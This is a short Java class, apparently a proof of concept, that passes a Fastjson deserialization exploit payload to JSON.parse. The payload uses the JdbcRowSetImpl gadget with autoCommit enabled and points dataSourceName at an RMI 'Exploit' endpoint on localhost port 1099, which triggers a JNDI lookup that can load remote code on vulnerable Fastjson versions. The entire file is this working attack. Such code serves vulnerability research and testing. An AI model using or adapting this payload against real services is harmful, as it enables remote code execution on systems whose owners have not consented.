package org.example;

import com.alibaba.fastjson.JSON;

public class FastJsonHighVersionJDK {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}
